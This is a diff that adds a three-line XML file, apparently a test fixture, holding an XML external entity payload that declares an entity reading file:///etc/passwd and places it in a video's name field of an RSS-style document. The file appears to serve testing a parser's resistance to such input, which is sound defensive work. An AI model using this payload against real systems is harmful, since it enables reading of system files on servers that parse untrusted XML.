@@ -1,0 +1,3 @@
+<?xml version="1.0"?>
+<!DOCTYPE rss [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<rss><list><video><id>bad</id><name>&xxe;</name></video></list></rss>
